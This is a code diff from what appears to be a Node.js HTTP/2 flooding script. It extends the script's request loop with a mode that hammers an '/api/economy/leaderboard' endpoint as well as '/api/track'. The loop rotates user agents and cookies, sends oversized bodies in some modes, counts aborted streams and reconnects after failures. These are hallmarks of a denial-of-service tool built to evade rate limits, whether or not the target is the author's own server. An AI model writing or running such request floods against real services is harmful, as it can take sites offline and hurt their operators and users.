@@ -182,9 +182,9 @@ async function h2run(){
       const t0w=Date.now();
       try{
         sent++;
-        const st=conn.request({':method':'POST',':path':'/api/track',':authority':HOST,'content-type':'application/json','user-agent':freshUA()||'atk-h2/1','accept-encoding':'identity','accept':'application/json, text/plain, */*',...(freshCookie()?{cookie:freshCookie()}:{})});
+        const st=conn.request({':method':MODE==='h2lb'?'GET':'POST',':path':MODE==='h2lb'?'/api/economy/leaderboard':'/api/track',':authority':HOST,'content-type':'application/json','user-agent':freshUA()||'atk-h2/1','accept-encoding':'identity','accept':'application/json, text/plain, */*',...(freshCookie()?{cookie:freshCookie()}:{})});
         const p=new Promise(res=>{st.on('response',h=>{st.resume();res(h[':status']);});st.on('error',()=>res('E'));st.on('close',()=>res('ABORT'));});
-        st.write(MODE==='h2trk'?FAT:tiny); st.end();
+        if(MODE!=='h2lb'){ st.write(MODE==='h2trk'?FAT:tiny); } st.end();
         const c=await p; codes[c]=(codes[c]||0)+1;
         if(c==='E'||c==='ABORT'){abort++;try{conn.close();}catch(e){} await ready();}
       }catch(e){abort++;try{conn.close();}catch(_){} await ready();}
